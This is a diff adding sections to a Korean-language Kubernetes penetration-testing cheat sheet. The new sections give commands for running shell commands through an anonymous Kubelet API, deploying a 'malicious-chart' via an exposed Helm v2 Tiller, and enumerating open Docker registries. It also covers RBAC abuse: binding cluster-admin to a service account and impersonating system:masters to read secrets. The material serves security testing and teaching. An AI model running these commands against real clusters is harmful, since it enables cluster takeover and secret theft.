@@ -292,3 +292,57 @@ kubectl delete clusterrolebinding pwn
 - [Peirates](https://github.com/inguardians/peirates) — K8s 펜테스트
 - [BustaKube](https://github.com/cyberark/kubesploit), [hadolint](https://github.com/hadolint/hadolint), [trivy](https://github.com/aquasecurity/trivy)
 - 관련: [Cloud 공격](index.md) (IRSA / Workload Identity / Pod Identity)
+
+---
+
+## 서비스 포트 기반 열거 및 공격
+
+### Kubelet API (10250) 익명 접근
+
+Kubelet API에 익명 접근(`--anonymous-auth=true`)이 허용되어 있다면, 토큰 없이 팟 내에서 명령어 실행이 가능하다.
+
+```bash
+# Kubelet 포트 확인 (일반적으로 10250, 10255(read-only))
+curl -sk https://<node-ip>:10250/pods | jq .
+
+# 팟 정보 파싱 후 명령 실행 (예: namespace: default, pod: nginx, container: nginx)
+curl -sk -X POST "https://<node-ip>:10250/run/default/nginx/nginx" -d "cmd=ls -la"
+```
+
+### Helm Tiller (44134, Helm v2)
+
+Helm v2 환경에서 Tiller 포트가 노출된 경우, gRPC를 통해 악의적인 차트를 배포해 클러스터 전체 권한을 획득할 수 있다. (Helm v3에서는 제거됨)
+
+```bash
+# 포트 스캔으로 44134 확인 후, 로컬 helm 클라이언트 연결
+export HELM_HOST=<target-ip>:44134
+helm install --name pwned ./malicious-chart
+```
+
+### Docker Registry (5000)
+
+사설 레지스트리가 인증 없이 열려있을 때, 컨테이너 이미지를 다운로드하거나 백도어 이미지를 푸시할 수 있다.
+
+```bash
+# 카탈로그 확인
+curl -s http://<registry-ip>:5000/v2/_catalog
+# 이미지 태그 확인
+curl -s http://<registry-ip>:5000/v2/<image-name>/tags/list
+```
+
+---
+
+## RBAC 권한 남용 및 공격
+
+1. **`create pods`**: `hostPath`, `hostPID`, `privileged` 플래그를 활용한 권한 상승 팟 생성
+2. **`list/get secrets`**: K8s 내부 시크릿(다른 SA의 토큰 등) 탈취
+3. **`create/update daemonsets/deployments`**: 워크로드 수정을 통한 악의적 컨테이너 실행
+4. **`bind` (ClusterRoleBinding / RoleBinding)**: 기존 SA에 클러스터 관리자 권한 부여
+   ```bash
+   kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:pwned-sa
+   ```
+5. **`impersonate`**: 상위 권한의 유저/그룹으로 위장하여 명령 실행
+   ```bash
+   kubectl get secrets --as=system:admin
+   kubectl get secrets --as-group=system:masters
+   ```
